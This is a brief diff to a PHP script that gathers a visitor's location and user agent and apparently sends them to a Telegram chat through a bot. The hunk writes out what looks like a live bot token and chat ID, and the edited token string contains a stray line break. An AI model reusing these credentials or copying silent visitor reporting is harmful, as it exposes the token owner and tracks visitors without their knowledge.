@@ -48,7 +48,8 @@ $location = implode("\n", $locationLines);
 $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
 
 // Telegram
-$telegramToken = 'AAFgaDNdcVCbr32885_h5mQlTAct0GOgAz8';
+$telegramToken = '7834884740:AAFgaDNdcVCbr32885_h5mQlTAct0GOgAz8
+';
 $chatId = '1433706945';
 $telegramUrl = "https://api.telegram.org/bot$telegramToken/sendMessage";
 $telegramMessage = $data['telegram_message'] ?? '';
